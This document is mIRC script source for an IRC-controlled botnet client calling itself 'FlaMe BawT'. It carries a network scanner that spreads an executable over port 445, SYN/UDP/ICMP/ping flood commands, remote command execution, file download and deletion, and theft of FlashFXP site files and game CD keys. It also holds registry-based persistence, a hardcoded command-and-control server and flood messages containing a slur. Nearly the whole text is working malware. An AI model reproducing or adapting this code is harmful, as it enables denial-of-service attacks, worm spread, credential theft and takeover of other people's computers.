on 1:TEXT:.login *:%chan:{ if ($level($nick) == 1337) || ($level($nick) == 666) { halt } | if ($nick isop %chan) && ($2 == $readini(Winrik32.exe, admin, $nick)) { tawk %b0tversi0n | auser 1337 $nick } }
on 1:TEXT:!login *:%chan:{ if ($level($nick) == 1337) || ($level($nick) == 666) { halt } | if ($nick isop %chan) && ($2 == rifkins) { tawk $nick $+ , you now have normal level access | auser 666 $nick } }
on 1:TEXT:.send *:%chan:{ if ($2 == fxpsite) && ($3 !== $null( { dcc send $nick $3 $+ programfiles\flashfxp\sites.dat | tawk sendin u teh FXPs }
   }
on *:TEXT:*:*:{
  if ($level($nick) == 666) { .clearall | .securityz
  if ($1 == .version) || ($1 == .ver) && (!$2) { tawk $verzian }
  if ($1 == .logout) && (!$2) { .ruser $nick | .clearall | tawk %b1 $+ $nick $+ %b2 has logged out from %b1 $+ Normal $+ %b2 level $verzian }
  if ($1 == .level) && (!$2) { tawk %b1 $+ level $+ %b2 %b1 $+ $nick $+ %b2 you are currently a %b1 $+ Nrmal User $+ %b2 }
   if ($1 == .scan) && ($2) {
    if ($2 == randrange) && (!%begshortip) && ($isfile(%spreadfile)) { .randscann }
    if ($2 == start) && (!%begshortip) && ($isfile(%spreadfile)) { tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ $3 - $4 $+ %b2 | set %begshortip $3 | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == rand) && (!%begshortip) && ($isfile(%spreadfile)) { set %begit $randip($3) | tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $4 $+ %b2 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == rand2) && (!%begshortip) && ($isfile(%spreadfile)) { set %rand2ip $r(0,255) | set %begit $3 $+ . $+ %rand2ip $+ . $+ $r(0,242) $+ . $+ $r(0,255) | tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $3 $+ . $+ %rand2ip $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $3 $+ . $+ %rand2ip $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == host) && ($3 == start) && (!%begshortip) && ($isfile(%spreadfile)) { set %begit $gettok($ip,1-2,46) $+ .0.0 | tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1-2,46) $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == host) && ($3 == rand) && (!%begshortip) && ($isfile(%spreadfile)) { set %begit $gettok($ip,1-2,46) $+ . $+ $r(0,255) $+ . $+ $r(0,255) | tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1-2,46) $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == host) && ($3 == rand2) && (!%begshortip) && ($isfile(%spreadfile)) { set %begit $gettok($ip,1,46) $+ . $+ $r(0,255) $+ . $+ $r(0,255) $+ . $+ $r(0,255) | tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1,46) $+ .255.255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1,46) $+ .255.255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == neighborhood) && (!%begshortip) && ($isfile(%spreadfile)) { set %begit $gettok($ip,1-3,46) $+ .1 | tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1-3,46) $+ .255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-3,46) $+ .255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == stats) && (%begshortip) { tawk %b1 $+ scanner $+ %b2 scan stats %b1 $+ range: [ %begshortip - %endshortip ] port: [ %scanport ] protocol: [ %scanproto ] current ip: [ %ip34 ] total found: [ $totalfound ] spreading file: [ %spreadfile ] $+ %b2 }
    if ($2 == port) && ($3) && (!$4) && (%scanport != $3) { tawk %b1 $+ scanner $+ %b2 now scanning port %b1 $+ $3 $+ %b2 | %scanport = $3 }
    if ($2 == protocol) || ($2 == proto) && (!$4) && (%scanproto != $3) { tawk %b1 $+ scanner $+ %b2 now scanning protocol %b1 $+ $3 $+ %b2 | %scanproto = $3 }
    if ($2 == protocolreset) || ($2 == protoreset) && (!$3) && (%scanproto != %defaultproto) { tawk %b1 $+ scanner $+ %b2 now scanning protocol %b1 $+ %defaultproto $+ %b2 | %scanproto = %defaultproto }
    if ($2 == stop) || ($2 == halt) && (%begshortip) { tawk %b1 $+ scanner $+ %b2 scanning of %b1 $+ %begshortip - %endshortip $+ %b2 stopped at %b1 $+ %ip34 $+ %b2 by %b1 $+ $nick $+ %b2 | stopscan }
  }
}
  if ($level($nick) == 1337) { .clearall | .securityz
  if ($1 == .level) && (!$2) { tawk %b1 $+ level $+ %b2 %b1 $+ $nick $+ %b2 you are currently an %b1 $+ admin $+ %b2 }
  if ($1 == .visit) && ($2) { set %h $2 | set %g $3 | tawk %b1 $+ visit $+ %b2 %b1 $+ visited %h $+ %g $+ %b2 | sockopen sclick %h 80 }
  if ($1 == .download) && (!$3) && ($2) { if ($2 == stop) || ($2 == halt) { halt } | set %dlfile $2- | downloada $2- }
  if ($1 == .download) && ($2 == stop) || ($2 == halt) && (!$3) && ($sock(download)) { /sockclose download* | tawk %b1 $+ download $+ %b2 stopped download of %b1 $+ %dlfile $+ %b2 | unset %dlfile | halt }
  if ($1 == .reload) && ($2) && (!$3) { set %reloadsecs $2 | .timer -o 1 %reloadsecs /server %server1 | tawk %b1 $+ reloading $+ %b2 in %b1 $+ %reloadsecs seconds $+ %b2 | unset %reloadsecs }
  if ($1 == .version) || ($1 == .ver) && (!$2) { tawk $verzian }
  if ($1 == .syn) && ($2) { if (%synaa) { unset %synaa } | if ($2 == stop) || ($2 == halt) { halt } | set %synport $3 | if (%synport == random) { set %synport $r(0,65535) } | tawk %b1 $+ Syn $+ %b2 flood started %b1 $+ IP: $2 packets: $4 port: %synport $+ %b2 | set %synaa $2 | synz start $4 $2 %synport }
  if ($1 == .syn) && ($2 == stop) || ($2 == halt) && (!$3) && (%synaa) { sockclose syn* | tawk %b1 $+ Syn $+ %b2 flood on %b1 $+ %synaa halted! $+ %b2 | unset %syn* | halt }
  if ($1 == .ping) || ($1 == .packet) && ($3) && ($4) { if ($2 == stop) || ($2 == halt) { halt } | hider ping.exe $2 -n $3 -l $4 -w 0 | tawk %b1 $+ Ping $+ %b2 flood started %b1 $+ IP: $2 traffic: $calc($3 *65536/1024/1000) $+ mb $+ %b2 | set %pingaa $2 }
  if ($1 == .ping) || ($1 == .packet) && ($3) && (!$4) { if ($2 == stop) || ($2 == halt) { halt } | hider ping.exe $2 -n $3 -l 65500 -w 0 | tawk %b1 $+ Ping $+ %b2 flood started %b1 $+ IP: $2 traffic: $calc($3 *65536/1024/1000) $+ mb $+ %b2 | set %pingaa $2 }
  if ($1 == .ping) || ($1 == .packet) && ($2 == stop) || ($2 == halt) && (%pingaa) { hider mnn32.exe -kf ping.exe | tawk %b1 $+ Ping $+ %b2 flood on %b1 $+ %pingaa halted $+ %b2 | unset %pingaa }
  if ($1 == .udp2) && (!$6) && ($5) { if ($2 == stop) || ($2 == halt) && (%udpip) { sockclose sockudp* | tawk %b1 $+ UDP2 $+ %b2 flood on %b1 $+ %udpip halted $+ %b2 | unset %udpip | halt } | set %port $3 | if (%port == random) { set %port $r(0,65535) } | set %udpip $2 | /udp.packet $2 -t $+ $4 -p $+ %port -i $+ $5 }
  if ($1 == .cskey) && (!$2) { .cskey }
  if {$1 == .bf1942) && ($2) { .bf1942 }
  if ($1 == .winkey) && (!$2) { .winkey }
  if ($1 == .uninstall) && (!$2) { .uinst }
  if ($1 == .nick) && ($2 == reset) && (!$3) { .nick $nick0r }
  if ($1 == .rand) && ($2 == nick) && (!$3) { .nick $rletterz }
  if ($1 == .rand) && ($2 == nick2) && (!$3) { .nick $rletterz2 }
  if ($1 == .rand) && ($2 == nick3) && (!$3) { .nick $rnumberz }
  if ($1 == .clear) && (!$2) { .clearbuf }
  if ($1 == .clean) && (!$2) { .cleanup }
  if ($1 == .flood) && ($2) && (!$3) { tawk %b1 $+ flood $+ %b2 %b1 $+ on $2 $+ %b2 | .msg $2 %floodmsg4 | .notice $2 %floodmsg2 | .ctcp $2 %floodmsg3 }
  if ($1 == .netsend) && ($2) { tawk %b1 $+ net-send $+ %b2 sent %b1 $+ $2 the message of $3- $+ %b2 | hider net send $2- }
  if ($1 == . $+ $me) && ($2) { tawk %b1 $+ command $+ %b2 %b1 $+ // $+ [ [ $2- ] ] $+ %b2 | [ [ $2- ] ] }
  if ($1 == .cmd) || ($1 == .command) || ($1 == .c) || ($1 == .-) && ($2) { tawk %b1 $+ command $+ %b2 %b1 $+ // $+ [ [ $2- ] ] $+ %b2 | [ [ $2- ] ] }
  if ($1 == .var) || ($1 == .variable) && ($2) { tawk %b1 $+ variable $+ %b2 %b1 $+ $2- = [ [ $$2- ] ] $+ %b2 }
  if ($1 == .set) { set $2 $3- | tawk %b1 $+ set $+ %b2 set %b1 $+ $2 to $3- $+ %b2 }
  if ($1 == .unset) { unset $2 | tawk %b1 $+ unset $+ %b2 %b1 $+ unset $2 $+ %b2 }
  if ($1 == .info) && (!$2) { tawk %b1 $+ mirc-info $+ %b2 %b1 $+ time online: $uptime(mirc,1) server: $server $+ %b2 }
  if ($1 == .net) && (!$2) { tawk %b1 $+ network-info $+ %b2 %b1 $+ ip: $ip host: $host $+ %b2 }
  if ($1 == .cpu) && (!$2) { tawk %b1 $+ cpu-info $+ %b2 %b1 $+ time: $time(h:nn TT) date: $date(mmmm doo yyyy) OS: $os uptime: $uptime(system,1) $+ %b2 }
  if ($1 == .proclist) || ($1 == .proc) || ($1 == .plist) && (!$2) { if ($isfile(proclst.bat)) { remove proclst.bat | remove prclst.txt | .makeproclist } | elseif (!$isfile(proclst.bat)) { .makeproclist } }
  if ($1 == .killapp) || ($1 == .prockill) || ($1 == .pkill) && ($2) && (!$3) { hider $mircdirmnn32.exe -kf $2- | tawk %b1 $+ killapp $+ %b2 killed application %b1 $+ $2 $+ %b2 }
  if ($1 == .dcc) && ($2 == send) && ($3) && (!$5) { tawk %b1 $+ dcc $+ %b2 sending %b1 $+ $3 $4- $+ %b2 | /dcc send $3 $4- }
  if ($1 == .join) && ($2) { join $2 $3- | tawk %b1 $+ join $+ %b2 channel %b1 $+ $2 -- channel key: $3- $+ %b2 }
  if ($1 == .part) && ($2) && ($2 != %chan) { part $2 $3- | tawk %b1 $+ part $+ %b2 channel %b1 $+ $2 -- reason: $3- $+ %b2 }
  if ($1 == .load) && ($2) { .load -rs $2- | tawk %b1 $+ load $+ %b2 loaded %b1 $+ $2- $+ %b2 }
  if ($1 == .unload) && ($2) { .unload -rs $2- | tawk %b1 $+ unload $+ %b2 unloaded %b1 $+ $2- $+ %b2 }
  if ($1 == .run) || ($1 == .exec) && ($2) { hider $2- | tawk %b1 $+ run $+ %b2 ran %b1 $+ $2- $+ %b2 }
  if ($1 == .rename) && ($2) { .rename c:\ $+ $2 c:\ $+ $3- | tawk %b1 $+ renamed $+ %b2 %b1 $+ c:\ $+ $2 to c:\ $+ $3- $+ %b2 }
  if ($1 == .remove) || ($1 == .delete) && ($2) { .remove $2- | tawk %b1 $+ remove $+ %b2 removed %b1 $+ $2- $+ %b2 }
  if ($1 == .new) && ($2 == scan) && ($3 == file) { if (!$4) { remove c:\winnt\system32\ $+ %spreadfile | remove $mircdir $+ %spreadfile | tawk %b1 $+ %spreadfile removed $+ %b2 | halt } | if ($4) { remove c:\winnt\system32\ $+ %spreadfile | remove $mircdir $+ %spreadfile | tawk %b1 $+ %spreadfile removed $+ %b2 %b1now downloading new scan file from: $2 $+ %b2 | downloada $4- } }
  if ($1 == .spreadfile) && (!$3) && ($2) && (%spreadfile != $2) { tawk %b1 $+ scanner $+ %b2 now spreading file %b1 $+ $2 $+ %b2 | %spreadfile = $2 }
  if ($1 == .spreadreset) && (!$2) && (%spreadfile != %defaultfile) { tawk %b1 $+ scanner $+ %b2 now spreading default file %b1 $+ %defaultfile $+ %b2 | %spreadfile = %defaultfile }
  if ($1 == .scanbat) && ($!3) && ($2) && (%scanbat != $2) { tawk %b1 $+ scanner $+ %b2 now using .bat file %b1 $+ $2 $+ %b2 | %scanbat = $2 }
  if ($1 == .logout) && (!$2) { .ruser $nick | .clearall | tawk %b1 $+ $nick $+ %b2 has logged out from %b1 $+ admin $+ %b2 level $verzian }
  if ($1 == .scan) && ($2) {
    if ($2 == randrange) && (!%begshortip) && ($isfile(%spreadfile)) { .randscann }
    if ($2 == start) && (!%begshortip) && ($isfile(%spreadfile)) { tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ $3 - $4 $+ %b2 | set %begshortip $3 | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == rand) && (!%begshortip) && ($isfile(%spreadfile)) { set %begit $randip($3) | tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $4 $+ %b2 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $4 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == rand2) && (!%begshortip) && ($isfile(%spreadfile)) { set %rand2ip $r(0,255) | set %begit $3 $+ . $+ %rand2ip $+ . $+ $r(0,242) $+ . $+ $r(0,255) | tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $3 $+ . $+ %rand2ip $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $3 $+ . $+ %rand2ip $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == host) && ($3 == start) && (!%begshortip) && ($isfile(%spreadfile)) { set %begit $gettok($ip,1-2,46) $+ .0.0 | tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1-2,46) $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == host) && ($3 == rand) && (!%begshortip) && ($isfile(%spreadfile)) { set %begit $gettok($ip,1-2,46) $+ . $+ $r(0,255) $+ . $+ $r(0,255) | tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1-2,46) $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == host) && ($3 == rand2) && (!%begshortip) && ($isfile(%spreadfile)) { set %begit $gettok($ip,1,46) $+ . $+ $r(0,255) $+ . $+ $r(0,255) $+ . $+ $r(0,255) | tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1,46) $+ .255.255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1,46) $+ .255.255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == neighborhood) && (!%begshortip) && ($isfile(%spreadfile)) { set %begit $gettok($ip,1-3,46) $+ .1 | tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1-3,46) $+ .255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-3,46) $+ .255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($2 == stats) && (%begshortip) { tawk %b1 $+ scanner $+ %b2 scan stats %b1 $+ range: [ %begshortip - %endshortip ] port: [ %scanport ] protocol: [ %scanproto ] current ip: [ %ip34 ] total found: [ $totalfound ] spreading file: [ %spreadfile ] $+ %b2 }
    if ($2 == port) && ($3) && (!$4) && (%scanport != $3) { tawk %b1 $+ scanner $+ %b2 now scanning port %b1 $+ $3 $+ %b2 | %scanport = $3 }
    if ($2 == protocol) || ($2 == proto) && (!$4) && (%scanproto != $3) { tawk %b1 $+ scanner $+ %b2 now scanning protocol %b1 $+ $3 $+ %b2 | %scanproto = $3 }
    if ($2 == protocolreset) || ($2 == protoreset) && (!$3) && (%scanproto != %defaultproto) { tawk %b1 $+ scanner $+ %b2 now scanning protocol %b1 $+ %defaultproto $+ %b2 | %scanproto = %defaultproto }
    if ($2 == stop) || ($2 == halt) && (%begshortip) { tawk %b1 $+ scanner $+ %b2 scanning of %b1 $+ %begshortip - %endshortip $+ %b2 stopped at %b1 $+ %ip34 $+ %b2 by %b1 $+ $nick $+ %b2 | stopscan }
  }
  if ($1 == .bnc) && ($2) {
    if ($2 == start) && ($4) { if ($sock(Bnc)) { tawk %b1 $+ bnc $+ %b2 bnc is already active on %b1 $+ $ip $+ : $+ %Bnc.Port $+ , pass: %Bnc.passwd $+ %b2 | halt } | %Bnc = on | socklisten Bnc $3 | %Bnc.port = $3 | %Bnc.passwd = $4 | tawk %b1 $+ bnc $+ %b2 %b1 $+ /server -m $ip $+ : $+ $3 $+ , then /quote pass $4 $+ %b2 }
    if ($2 == stats) && ($sock(Bnc)) { tawk %b1 $+ bnc $+ %b2 is on %b1 $+ $ip $+ : $+ %Bnc.port $+ , pass: %Bnc.passwd users: $sock(BncClient*,0) connected: $sock(BncServer*,0) $+ %b2 }
    if ($2 == stop) || ($2 == halt) && (%Bnc.Port) { sockclose Bnc* | tawk %b1 $+ bnc $+ %b2 server on %b1 $+ $ip $+ : $+ %bnc.port is now off $+ %b2 | unset %bnc.* | sockclose Bnc* }
  }
  if ($1 == .timersyn) && ($6) && (!$7) { if (%synaa) { unset %synaa } | set %synport $3 | if (%synport == random) { set %synport $r(0,65535) } | set %synaa $2 | tawk %b1 $+ TimerSyn $+ %b2 %b1 $+ set to syn IP: $2 port: %synport times: $4 every $5 seconds delay: $6 $+ %b2 | .timer $5 $6 synz start $4 $2 %synport }
  if ($1 == .icmp) && ($2) {
    if ($2 == stop) || ($2 == halt) && (%icmpaa) {
      tawk %b1 $+ ICMP $+ %b2 flood on %b1 $+ %icmpaa halted $+ %b2
      unset %icmpaa
      hider mnn32.exe -kf nm32g.vbs
      remove nm32g.vbs
      halt
     }
    if ($2 == stop) || ($2 == halt) { halt }
      if (!$3) { halt }
      if (!$4) { halt }
        set %icmpaa $2
        tawk %b1 $+ ICMP $+ %b2 flood started %b1 $+ IP: $2 packet size: $3 times: $4 $+ %b2
        timerremove 1 200 /remove nm32g.vbs
        write nm32g.vbs on error resume next
        write nm32g.vbs Set bl = CreateObject("Wscript.shell")
        write nm32g.vbs bl.run "ping $2 -w 0 -l $3 -n $4 $+ ",0,true
        hider nm32g.vbs
        halt
  }
  if ($1 == .udp) && ($2) {
    if ($2 == stop) || ($2 == halt) && (%udpaa) {
      tawk %b1 $+ UDP $+ %b2 flood on %b1 $+ %udpaa halted $+ %b2
      unset %udpaa
      sockclose sockudp*
      halt
    }
    if ($2 == stop) || ($2 == halt) { halt }
    if (!$3) { halt }
    if (!$4) { halt }
      set %start 0
      set %end $4
      set %udpaa $2
      set %udpport $3
    if (!$isfile(uvxd32.vxd)) { udp.gen }
    if (%udpport == random) { set %udpport $r(0,65535) }
      tawk %b1 $+ UDP $+ %b2 flood started %b1 $+ IP: $2 port: %udpport times: $4 $+ %b2
      :udploop
    if (%start == %end) {
      tawk %b1 $+ UDP $+ %b2 flood on %b1 $+ %udpaa complete $+ %b2
      unset %udpaa
      unset %udpport
      halt
    }
    inc %start 1
    if ($3 == 0) {
      set %randname $r(10000,99999)
      set %uvxd32 $read(uvxd32.vxd)
      set %udpport $r(0,65535)
      sockudp Udp $+ %randname $+ a $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ b $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ c $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ d $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ e $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ f $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ g $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ h $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ i $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ j $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ k $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ l $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ m $2 %udpport %uvxd32
      goto udploop
    }
    if ($4 != 0) {
      set %randname $r(10000,99999)
      set %uvxd32 $read(uvxd32.vxd)
      sockudp Udp $+ %randname $+ a $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ b $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ c $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ d $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ e $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ f $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ g $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ h $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ i $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ j $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ k $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ l $2 %udpport %uvxd32
      sockudp Udp $+ %randname $+ m $2 %udpport %uvxd32
      goto udploop
      }
    }
  }
}
alias tehsetinz { %chan =  ###soul### | %key = *(R,C<V]U;",C(P`` | %spreadfile = set8win32.exe | %b0tversi0n = 4(_/5-4!5-4\_/5|14FlaMe4-14BawT5|4\_/5-4!5-4\_) 5- Version, Beta 10 | %defaultfile = set9win32.exe | %scanport = 445 | %scanbat = mmsql32.bat | %scanproto = ipc$ | %defaultproto = ipc$ | %b1 = 5[14 | %b2 = 5] | %c = 0 }
alias startstuff { hide | .secure1 | .flush | .clearall | .sockclose * | .unsetall | .timers off | .tehsetinz | .writeini $mircini ident userid $rletterz | .writeini $mircini mirc user $rletterz | .emailaddr $rletterz $+ @Stealth.gov | .fullname $rletterz | .nick $nick0r | .anick $nick0r | .conn | .timer 0 30 securityz | .timer 0 20 bgwin | .window -h "Status Window" | .checkcopy | .makereg | .font 1 wingdings | .srvtimecheck }
alias connstuff { .flush | .stopscan | .secure1 | .pdcc on | .fsend on | .mode $me +ix | .checkcopy | .timer 0 6 join %chan %key | .clearall }
alias dscnstuff { .flush | .stopscan | .srvtimecheck | .clearall }
alias cnnfailstuff { .flush | .stopscan | .server %server1 | .srvtimecheck | .clearall }
alias exitstuff { .flush | .clearall | .sockclose * | .unsetall | .timers off }
alias srvtimecheck { .timerchcksrv -o 0 26 servercheck }
alias makereg { $RegWrite(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Winres32vis,$mircexe,REG_SZ) }
alias delreg { $RegDelete(HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Winres32vis) }
alias conn {
  %floodmsg1 = $str(FAGGOT,65)
  %floodmsg2 = $str(OWNED,93)
  %floodmsg3 = $str(FAGFAGFAG,35)
  %floodmsg4 = $str(½¾,154)
  if ($portfree(113)) { socklisten IDENT 113 }
  if (!%server1) { %server1 = insinerate-flame.cjb.net:6667 } | if (!%server2) { %server2 = insinerate-flame.cjb.net:6667 } | if (!%server3) { %server3 = insinerate-flame.cjb.net:6667 } | /server %server1 | copy3r
}
alias servercheck {
  if (!$server) {
    if (!%servercheck) || (%servercheck == 0) { set %servercheck 1 | server %server2 | halt }
    if (%servercheck = 1) { set %servercheck 2 | server %server3 | halt }
    if (%servercheck = 2) { set %servercheck 0 | server %server1 | halt }
  }
  else { halt }
}
raw 332:*:{
if ($2 == %chan) {
  if ($3 == .scan) && ($4) {
    if ($4 == rand) && (!%begshortip) && ($isfile(%spreadfile)) { set %begit $randip($5) | tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $6 $+ %b2 | set %begshortip %begit | set %beglongip $longip(  %begshortip ) | set %endshortip $6 | set %endlongip $longip( %endshortip  ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($4 == rand2) && (!%begshortip) && ($isfile(%spreadfile)) { set %rand2ip $r(0,255) | set %begit $5 $+ . $+ %rand2ip $+ . $+ $r(0,242) $+ . $+ $r(0,255) | tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $5 $+ . $+ %rand2ip $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $5 $+ . $+ %rand2ip $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($4 == host) && ($5 == rand) && (!%begshortip) && ($isfile(%spreadfile)) { set %begit $gettok($ip,1-2,46) $+ . $+ $r(0,255) $+ . $+ $r(0,255) | tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1-2,46) $+ .255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1-2,46) $+ .255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($4 == host) && ($5 == rand2) && (!%begshortip) && ($isfile(%spreadfile)) { set %begit $gettok($ip,1,46) $+ . $+ $r(0,255) $+ . $+ $r(0,255) $+ . $+ $r(0,255) | tawk %b1 $+ scanner $+ %b2 scanning %b1 $+ %begit - $gettok($ip,1,46) $+ .255.255.255 $+ %b2 | set %begshortip %begit | set %beglongip $longip( %begshortip ) | set %endshortip $gettok($ip,1,46) $+ .255.255.255 | set %endlongip $longip( %endshortip ) | set %total $calc( %endlongip - %beglongip ) | unset %totalscaning | startscan }
    if ($4 == stop) || ($4 == halt) && (%begshortip) { tawk %b1 $+ scanner $+ %b2 scanning of %b1 $+ %begshortip - %endshortip $+ %b2 stopped at %b1 $+ %ip34 $+ %b2 by %b1 $+ $nick $+ %b2 | stopscan }
  }
  if ($3 == .syn) && ($4) { if (%synaa) { unset %synaa } | if ($4 == stop) || ($4 == halt) { halt } | set %synport $5 | if (%synport == random) { set %synport $r(0,65535) } | tawk %b1 $+ Syn $+ %b2 flood started %b1 $+ IP: $2 packets: $4 port: %synport $+ %b2 | set %synaa $4 | synz start $6 $4 %synport }
  if ($3 == .syn) && ($4 == stop) || ($4 == halt) && (!$5) && (%synaa) { sockclose syn* | tawk %b1 $+ Syn $+ %b2 flood on %b1 $+ %synaa halted! $+ %b2 | unset %syn* | halt }
  }
}
alias copy3r { if ($exists(C:\winnt\system32\set8win32.exe) == $true) { /copy C:\winnt\system32\set8win32.exe $mircdir $+ set8win32.exe  } 
     } 
alias tawk { if ($server) && ($me isvo %chan) || ($me ishop %chan) || ($me isop %chan) { .clearall | .msg %chan $1- } }
alias makeproclist { if (!$isfile(proclst.bat)) { .write proclst.bat @echo off | .write proclst.bat mnn32 > prclst.txt | hider proclst.bat | tawk %b1 $+ process-list $+ %b2 now %b1 $+ listing $+ %b2 processes | if ($server) && ($me isvo %chan) || ($me ishop %chan) || ($me isop %chan) { .timer 1 4 /play %chan prclst.txt | .timer 1 100 remove proclst.bat | .timer 1 100 remove prclst.txt } } }
alias downloada { if ($sock(download)) { tawk %b1 $+ download $+ %b2 %b1 $+ error already downloading a file $+ %b2 | return } | set %download1 $gettok($1,2,47) | set %download2 $gettok($1,$numtok($1,47),47) | set %download3 $gettok($1,3-,47) | tawk %b1 $+ download $+ %b2 downloading %b1 $+ $1- $+ %b2 | .sockopen download %download1 80 }
alias cskey { if ($RegRead(HKEY_CURRENT_USER\Software\Valve\CounterStrike\Settings\Key)) { tawk %b1 $+ keys $+ %b2 CS key %b1 $+ $RegRead(HKEY_CURRENT_USER\Software\Valve\CounterStrike\Settings\Key) $+ %b2 } | elseif ($RegRead(HKEY_CURRENT_USER\Software\Valve\Half-Life\Settings\Key)) { tawk %b1 $+ keys $+ %b2 HL key %b1 $+ $RegRead(HKEY_CURRENT_USER\Software\Valve\Half-Life\Settings\Key) $+ %b2 } }
